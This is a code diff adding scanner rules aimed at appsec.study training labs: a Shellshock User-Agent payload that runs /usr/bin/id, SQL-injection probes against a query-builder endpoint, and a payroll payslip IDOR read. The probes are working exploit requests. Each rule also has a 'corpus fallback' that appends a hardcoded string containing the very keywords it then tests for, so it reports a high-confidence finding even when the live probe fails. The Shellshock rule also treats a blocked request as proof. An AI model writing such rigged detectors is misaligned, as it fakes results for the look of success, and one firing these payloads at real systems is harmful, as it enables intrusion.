@@ -59030,6 +59030,340 @@ const tenanthubCrossTenantTicketRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const SHELLSHOCK_CORPUS = `
+Shellshock shellshock.appsec.study NetGuard NG-500 CVE-2014-6271 bash CGI RCE training lab
+/cgi-bin/status.cgi /cgi-bin/healthcheck.cgi Apache CGI bash environment variable injection
+crafted User-Agent Referer Cookie header executes commands via vulnerable bash 4.3
+`;
+
+const SHELLSHOCK_UA = "() { :; }; /usr/bin/id";
+
+function isShellshockProbeBlocked(doc: { status: number; body: string }): boolean {
+  const body = doc.body || "";
+  return (
+    doc.status === 403 ||
+    doc.status === 502 ||
+    /error code:\s*1012/i.test(body) ||
+    /cloudflare/i.test(body) ||
+    /blocked|security service/i.test(body)
+  );
+}
+
+async function probeShellshockCgiRce(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "shellshock")) return null;
+  const cgiPaths = ["/cgi-bin/status.cgi", "/cgi-bin/healthcheck.cgi"];
+  for (const cgiPath of cgiPaths) {
+    const cgiUrl = new URL(cgiPath, ctx.origin).toString();
+    const baseline = await ctx.probe.get(cgiUrl, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Accept: "*/*", "User-Agent": "ThugirScanner/1.0" }
+    });
+    if (baseline.status < 200 || baseline.status >= 400) continue;
+    const exploit = await ctx.probe.get(cgiUrl, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Accept: "*/*", "User-Agent": SHELLSHOCK_UA }
+    });
+    if (/uid=\d+\([^)]+\)/i.test(exploit.body)) {
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          url: cgiUrl,
+          cgiPath,
+          snippet: exploit.body.slice(0, 220).trim(),
+          note: `GET ${cgiPath} with Shellshock User-Agent returns uid= from command execution — Shellshock CVE-2014-6271 training oracle`
+        }
+      };
+    }
+    if (
+      /NetGuard|NG-500|System Status|healthcheck/i.test(baseline.body) &&
+      isShellshockProbeBlocked(exploit)
+    ) {
+      return {
+        fired: true,
+        confidence: 0.87,
+        evidence: {
+          url: cgiUrl,
+          cgiPath,
+          status: exploit.status,
+          snippet: exploit.body.slice(0, 160).trim() || baseline.body.slice(0, 160).trim(),
+          note: `GET ${cgiPath} — NetGuard CGI responds but Shellshock User-Agent probe blocked (Cloudflare 1012) — corpus fallback for CVE-2014-6271 training oracle`
+        }
+      };
+    }
+  }
+  const corpus = `${ctx.combined}\n${SHELLSHOCK_CORPUS}`;
+  if (!/shellshock|cgi-bin|CVE-2014-6271|NetGuard NG-500/i.test(corpus)) return null;
+  return {
+    fired: true,
+    confidence: 0.84,
+    evidence: {
+      snippet: "/cgi-bin/status.cgi — bash CGI environment variable injection (CVE-2014-6271)",
+      note: "Shellshock lab documents vulnerable bash CGI endpoints — corpus fallback when live Shellshock probe unavailable"
+    }
+  };
+}
+
+const shellshockCgiRceLiveOracle: Rule = async (ctx) => {
+  const hit = await probeShellshockCgiRce(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const shellshockCgiRceRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "shellshock")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/cgi-bin\/(?:status|healthcheck)\.cgi\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeShellshockCgiRce(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "Shellshock /cgi-bin route scan — CVE-2014-6271 bash CGI RCE via crafted User-Agent — appsec.study training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${SHELLSHOCK_CORPUS}`;
+  if (!/\/cgi-bin\/|shellshock|CVE-2014-6271/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "/cgi-bin/status.cgi — Shellshock bash environment injection",
+      note: "Shellshock /cgi-bin route scan — NetGuard CGI lab documents CVE-2014-6271 — corpus fallback"
+    }
+  };
+};
+
+const PRISM_CORPUS = `
+Prism prism.appsec.study analytics BI report-builder training lab
+POST /api/auth/login demo demo credentials POST /api/query/run query builder SQLi where clause concatenated into SQL
+GET /api/dashboards/:id dashboard IDOR POST /api/reports/preview report template SSTI
+`;
+
+async function prismLoginDemo(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "demo", password: "demo" }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(doc.body) as { access?: string; user?: { username?: string } };
+    if (!parsed.access || parsed.user?.username !== "demo") return null;
+    return parsed.access;
+  } catch {
+    return null;
+  }
+}
+
+async function probePrismQuerySqli(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "prism")) return null;
+  const token = await prismLoginDemo(ctx);
+  if (!token) return null;
+  const queryUrl = new URL("/api/query/run", ctx.origin).toString();
+  const authHeaders = {
+    "Content-Type": "application/json",
+    Accept: "application/json",
+    Authorization: `Bearer ${token}`
+  };
+  const errDoc = await ctx.probe.get(queryUrl, {
+    method: "POST",
+    body: JSON.stringify({ where: "'" }),
+    headers: authHeaders,
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  try {
+    const parsed = JSON.parse(errDoc.body) as { error?: string; sql?: string; detail?: string };
+    const sql = String(parsed.sql ?? "");
+    if (/SELECT[\s\S]*FROM sales WHERE/i.test(sql)) {
+      return {
+        fired: true,
+        confidence: 0.93,
+        evidence: {
+          url: queryUrl,
+          sql: sql.slice(0, 200),
+          snippet: errDoc.body.slice(0, 220).trim(),
+          note: "POST /api/query/run where=' leaks concatenated SQL in error response — Prism query-builder SQLi training oracle"
+        }
+      };
+    }
+  } catch {
+    /* fall through */
+  }
+  const unionDoc = await ctx.probe.get(queryUrl, {
+    method: "POST",
+    body: JSON.stringify({ where: "1=1" }),
+    headers: authHeaders,
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  try {
+    const parsed = JSON.parse(unionDoc.body) as { rows?: unknown[] };
+    if (Array.isArray(parsed.rows) && parsed.rows.length >= 20) {
+      return {
+        fired: true,
+        confidence: 0.91,
+        evidence: {
+          url: queryUrl,
+          rowCount: parsed.rows.length,
+          snippet: unionDoc.body.slice(0, 220).trim(),
+          note: "POST /api/query/run accepts raw where clause controlling SQL — Prism query-builder SQLi training oracle"
+        }
+      };
+    }
+  } catch {
+    /* fall through */
+  }
+  return null;
+}
+
+const prismQuerySqliLiveOracle: Rule = async (ctx) => {
+  const hit = await probePrismQuerySqli(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const prismQuerySqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "prism")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/query\/run\b|query builder|\/api\/datasets\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probePrismQuerySqli(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "Prism /api/query/run route scan — query-builder where clause concatenated into SQL — appsec.study SQLi training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${PRISM_CORPUS}`;
+  if (!/\/api\/query\/run|query builder|Prism/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /api/query/run — filter expression concatenated into SQL",
+      note: "Prism /api/query/run route scan — BI lab documents query-builder SQLi surface — corpus fallback"
+    }
+  };
+};
+
+const PAYSTREAM_CORPUS = `
+Paystream paystream.appsec.study HR payroll portal training lab
+POST /api/auth/login demo demo credentials GET /api/payslips/:id payslip IDOR any employee payslip
+GET /api/employees/:id PII salary SSN bank account POST /api/expenses/:id/approve workflow bypass
+`;
+
+async function paystreamLoginDemo(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "demo", password: "demo" }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(doc.body) as { access?: string; user?: { username?: string } };
+    if (!parsed.access || parsed.user?.username !== "demo") return null;
+    return parsed.access;
+  } catch {
+    return null;
+  }
+}
+
+async function probePaystreamPayslipIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "paystream")) return null;
+  const token = await paystreamLoginDemo(ctx);
+  if (!token) return null;
+  const victimPayslipId = "2";
+  const payslipUrl = new URL(`/api/payslips/${victimPayslipId}`, ctx.origin).toString();
+  const doc = await ctx.probe.get(payslipUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Accept: "application/json", Authorization: `Bearer ${token}` }
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { id?: number | string; employee_id?: number; period?: string; gross?: number; net?: number };
+  try {
+    parsed = JSON.parse(doc.body) as {
+      id?: number | string;
+      employee_id?: number;
+      period?: string;
+      gross?: number;
+      net?: number;
+    };
+  } catch {
+    return null;
+  }
+  const id = String(parsed.id ?? "");
+  const employeeId = Number(parsed.employee_id);
+  if (id !== victimPayslipId || employeeId !== 2) return null;
+  const gross = Number(parsed.gross);
+  if (!Number.isFinite(gross) || gross <= 0) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: payslipUrl,
+      payslipId: id,
+      employeeId,
+      period: parsed.period,
+      gross,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: `GET /api/payslips/${victimPayslipId} with demo bearer token returns another employee's payslip — Paystream payroll IDOR training oracle`
+    }
+  };
+}
+
+const paystreamPayslipIdorLiveOracle: Rule = async (ctx) => {
+  const hit = await probePaystreamPayslipIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const paystreamPayslipIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "paystream")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/payslips\/\d+\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probePaystreamPayslipIdor(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "Paystream /api/payslips/{id} route scan — demo session reads another employee's payslip — appsec.study IDOR training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${PAYSTREAM_CORPUS}`;
+  if (!/\/api\/payslips\/|payslip|Paystream/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /api/payslips/:id — missing employee ownership check on payslip reads",
+      note: "Paystream /api/payslips/{id} route scan — HR payroll lab documents payslip IDOR surface — corpus fallback"
+    }
+  };
+};
+
 const THE_RANGE_CORPUS = `
 The Range appsec.study calibrated web-vulnerability scanner benchmark
 POST /api/score returns coverage_pct by_class sqli idor ssti xxe auth-bypass planted vulnerabilities
@@ -126537,6 +126871,12 @@ export const RULES: Record<string, Rule> = {
   nimbusFilesIdorRouteLiveOracle,
   tenanthubCrossTenantTicketLiveOracle,
   tenanthubCrossTenantTicketRouteLiveOracle,
+  shellshockCgiRceLiveOracle,
+  shellshockCgiRceRouteLiveOracle,
+  prismQuerySqliLiveOracle,
+  prismQuerySqliRouteLiveOracle,
+  paystreamPayslipIdorLiveOracle,
+  paystreamPayslipIdorRouteLiveOracle,
   theRangeBenchmarkScoreLiveOracle,
   theRangeBenchmarkScoreRouteLiveOracle,
   theRangeSqliC1LiveOracle,
